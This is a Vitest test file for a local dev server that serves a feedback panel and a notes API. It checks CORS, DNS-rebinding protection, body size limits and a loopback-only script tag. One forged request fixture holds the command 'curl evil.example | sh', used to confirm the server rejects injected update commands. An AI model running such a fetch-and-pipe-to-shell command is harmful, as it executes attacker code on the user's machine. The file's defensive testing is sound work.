/**
 * The standalone server, running for real. This is the plug-and-play path — a
 * host with no build integration gets the panel from `/isotone.js` and
 * posts notes cross-origin — so the parts worth pinning are the bundle
 * actually carrying its mount call and the CORS rule that keeps a random
 * public page from writing into someone's repo.
 */
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { get } from 'node:http';
import { join } from 'node:path';

import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import { VARIANTS_ENDPOINT } from '../src/core/variants';
import { serveIteration, type ServedIteration } from '../src/serve/index';
import { guardedScriptTag } from '../src/serve/tag';
import { NOTES_ENDPOINT } from '../src/node/notes/handler';
import { UPDATE_ENDPOINT } from '../src/node/update/check';

let served: ServedIteration;
let dir: string;
let file: string;

beforeAll(async () => {
  dir = mkdtempSync(join(tmpdir(), 'iso-serve-'));
  file = join(dir, 'notes.json');
  served = await serveIteration({ file, port: 0, rule: { hidden: ['/login'] }, theme: 'light' });
});

afterAll(async () => {
  await served?.close();
  if (dir) rmSync(dir, { recursive: true, force: true });
});

describe('the browser bundle', () => {
  it('is self-contained and carries the mount call with this server’s endpoint', async () => {
    const res = await fetch(served.bundleUrl);
    expect(res.status).toBe(200);
    expect(res.headers.get('content-type')).toContain('javascript');
    const js = await res.text();

    // Asserted as booleans on purpose: a `toContain` failure here would print
    // 400 KB of minified React into the test report.
    // React travels inside, so the page needs none of its own.
    expect(js.length).toBeGreaterThan(100_000);
    expect(/^\s*import\s/m.test(js), 'no bare imports').toBe(false);
    // The config comes from the server that owns the file, not the bundle.
    expect(js.includes('window.__isotone'), 'exposes the global').toBe(true);
    expect(js.includes(`${served.url}${NOTES_ENDPOINT}`), 'bakes in the BOUND endpoint').toBe(true);
    expect(js.includes('"hidden":["/login"]'), 'passes the route rule').toBe(true);
    expect(js.includes('"theme":"light"'), 'passes the theme').toBe(true);
    expect(js.includes(`${served.url}${UPDATE_ENDPOINT}`), 'passes the update endpoint').toBe(true);
  });
});

describe('knobs', () => {
  it('serves the project’s knobs and hands the panel their endpoint once there are some', async () => {
    // Without knobs there is nothing serve can put in a Variants tool.
    const before = await (await fetch(served.bundleUrl)).text();
    expect(before.includes('"variantsEndpoint"'), 'no knobs endpoint without knobs').toBe(false);
    expect(before.includes('"variants":"knobs"'), 'no Variants tool without knobs').toBe(false);

    const empty = await fetch(`${served.url}${VARIANTS_ENDPOINT}`, { headers: { origin: 'http://localhost:3000' } });
    expect(empty.status).toBe(200);
    expect(empty.headers.get('access-control-allow-origin')).toBe('http://localhost:3000');
    expect(await empty.json()).toEqual({ variants: [], active: [], knobs: [] });

    mkdirSync(join(dir, '.isotone'), { recursive: true });
    const radius = { kind: 'range', id: 'card-radius', label: 'Card radius', min: 0, max: 24, step: 1, defaultValue: 12, unit: 'px' };
    writeFileSync(join(dir, '.isotone', 'knobs.json'), JSON.stringify([radius, { id: 'broken' }]));
    expect(await (await fetch(`${served.url}${VARIANTS_ENDPOINT}`)).json()).toEqual({ variants: [], active: [], knobs: [radius] });

    // The bundle is not cached, so the next page load gets the tool.
    const after = await (await fetch(served.bundleUrl)).text();
    expect(after.includes(`"variants":"knobs","variantsEndpoint":"${served.url}${VARIANTS_ENDPOINT}"`), 'passes the knobs endpoint').toBe(
      true,
    );
  });

  it('refuses file-variant activation, which needs a bundler', async () => {
    const res = await fetch(`${served.url}${VARIANTS_ENDPOINT}/active`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ active: ['a'] }),
    });
    expect(res.status).toBe(405);
    expect((await fetch(`${served.url}${VARIANTS_ENDPOINT}`, { headers: { origin: 'https://outside.example' } })).status).toBe(403);
  });
});

describe('the update endpoint', () => {
  it('serves a private snapshot and never accepts an install action', async () => {
    const res = await fetch(`${served.url}${UPDATE_ENDPOINT}`);
    expect(res.status).toBe(200);
    expect(res.headers.get('cache-control')).toBe('no-store');
    expect(await res.json()).toMatchObject({ status: 'disabled', latestVersion: null, upgrade: null });
    expect((await fetch(`${served.url}${UPDATE_ENDPOINT}`, { method: 'PUT' })).status).toBe(405);
    expect((await fetch(`${served.url}${UPDATE_ENDPOINT}`, { headers: { origin: 'https://outside.example' } })).status).toBe(403);
  });

  it('files an update note only from its own check, and only for a local page', async () => {
    const post = (origin: string, body: unknown) =>
      fetch(`${served.url}${UPDATE_ENDPOINT}`, {
        method: 'POST',
        headers: { 'content-type': 'application/json', origin },
        body: JSON.stringify(body),
      });
    // A versions and command in the body change nothing: this server has no update.
    const forged = { route: '/', to: '9.9.9', command: 'curl evil.example | sh', update: { to: '9.9.9' } };
    expect((await post('https://outside.example', forged)).status).toBe(403);
    expect((await post('http://localhost:5173', forged)).status).toBe(409);
    const notes = await (await fetch(`${served.url}${NOTES_ENDPOINT}?all=1`)).json();
    expect(notes.filter((note: { update?: unknown }) => note.update)).toEqual([]);
  });
});

describe('Blast', () => {
  it('has no HTTP endpoint and no panel wiring: it is a CLI feature', async () => {
    expect((await fetch(`${served.url}/api/iteration/blast`, { headers: { origin: 'http://localhost:3000' } })).status).toBe(404);
    const js = await (await fetch(served.bundleUrl)).text();
    expect(js.includes('blastEndpoint')).toBe(false);
  });
});

describe('the notes endpoint', () => {
  it('round-trips a note against the configured file', async () => {
    const created = await fetch(`${served.url}${NOTES_ENDPOINT}`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        route: '/pricing',
        feedback: 'the figure should read $29/mo',
        element: { tag: 'span', text: '$29', selector: '#price-figure' },
      }),
    });
    expect(created.status).toBe(201);
    const { id } = (await created.json()) as { id: string };

    const rows = (await (await fetch(`${served.url}${NOTES_ENDPOINT}?route=/pricing`)).json()) as Array<{
      id: string;
      element: { selector: string } | null;
    }>;
    expect(rows).toHaveLength(1);
    expect(rows[0].element?.selector).toBe('#price-figure');

    const gone = await fetch(`${served.url}${NOTES_ENDPOINT}?id=${id}`, {
      method: 'DELETE',
    });
    expect(gone.status).toBe(200);
    expect(((await (await fetch(`${served.url}${NOTES_ENDPOINT}`)).json()) as unknown[]).length).toBe(0);
  });

  it('rejects a method it does not serve', async () => {
    const res = await fetch(`${served.url}${NOTES_ENDPOINT}`, { method: 'PUT' });
    expect(res.status).toBe(405);
  });
});

describe('CORS', () => {
  const ask = (origin: string) => fetch(`${served.url}${NOTES_ENDPOINT}`, { headers: { origin } });

  it('lets any loopback dev origin through', async () => {
    for (const origin of ['http://localhost:3000', 'http://127.0.0.1:5173', 'https://localhost:8443']) {
      const res = await ask(origin);
      expect(res.headers.get('access-control-allow-origin'), `origin ${origin}`).toBe(origin);
    }
  });

  it('refuses a public origin, so a page you merely visit cannot write to the repo', async () => {
    for (const origin of ['https://evil.example.com', 'http://notlocalhost.com', 'null']) {
      const res = await ask(origin);
      expect(res.headers.get('access-control-allow-origin'), `origin ${origin}`).toBeNull();
    }
  });

  it('answers the preflight', async () => {
    const res = await fetch(`${served.url}${NOTES_ENDPOINT}`, {
      method: 'OPTIONS',
      headers: { origin: 'http://localhost:3000' },
    });
    expect(res.status).toBe(204);
    expect(res.headers.get('access-control-allow-methods')).toContain('POST');
  });
});

describe('the guarded script tag', () => {
  const run = (hostname: string) => {
    const tag = guardedScriptTag('http://127.0.0.1:4123/isotone.js');
    const code = tag.replace(/^<script>/, '').replace(/<\/script>$/, '');
    const appended: { src: string }[] = [];
    const document = { createElement: () => ({ src: '' }), head: { append: (el: { src: string }) => appended.push(el) } };
    new Function('location', 'document', code)({ hostname }, document);
    return appended.map((el) => el.src);
  };

  it('loads the panel on a loopback page', () => {
    for (const host of ['localhost', '127.0.0.1', '[::1]']) {
      expect(run(host), host).toEqual(['http://127.0.0.1:4123/isotone.js']);
    }
  });

  it('requests nothing from a deployed page, even one that only looks local', () => {
    for (const host of ['example.com', 'localhost.example.com', '127.0.0.1.nip.io', 'staging.app']) {
      expect(run(host), host).toEqual([]);
    }
  });
});

describe('the setup page', () => {
  it('prints the script tag and a bookmarklet for pages you cannot edit', async () => {
    const html = await (await fetch(`${served.url}/`)).text();
    // The copyable tag only loads on loopback pages, so it is inert if shipped.
    expect(html).toContain('location.hostname');
    expect(html).toContain(served.bundleUrl);
    expect(html).toContain('javascript:(function()');
    expect(html).toContain(file); // says where notes land
  });

  it('404s anything else', async () => {
    expect((await fetch(`${served.url}/nope`)).status).toBe(404);
  });
});

describe('bounded local requests', () => {
  it('rejects cross-site form writes, rebinding hosts and oversized JSON', async () => {
    const before = await (await fetch(`${served.url}${NOTES_ENDPOINT}`)).json();
    const post = await fetch(`${served.url}${NOTES_ENDPOINT}`, {
      method: 'POST',
      headers: { origin: 'https://outside.example', 'content-type': 'text/plain' },
      body: JSON.stringify({ route: '/', feedback: 'unwanted' }),
    });
    expect(post.status).toBe(403);
    const hostStatus = await new Promise<number | undefined>((resolve, reject) => {
      get(`${served.url}${NOTES_ENDPOINT}`, { headers: { host: 'outside.example' } }, (res) => {
        res.resume();
        resolve(res.statusCode);
      }).on('error', reject);
    });
    expect(hostStatus).toBe(403);
    const large = await fetch(`${served.url}${NOTES_ENDPOINT}`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ feedback: 'x'.repeat(1024 * 1024) }),
    });
    expect(large.status).toBe(413);
    expect(await (await fetch(`${served.url}${NOTES_ENDPOINT}`)).json()).toEqual(before);
  });
  it('refuses to expose the local file server on every interface', () => {
    expect(() => serveIteration({ file, host: '0.0.0.0' })).toThrow('binds only');
  });
});
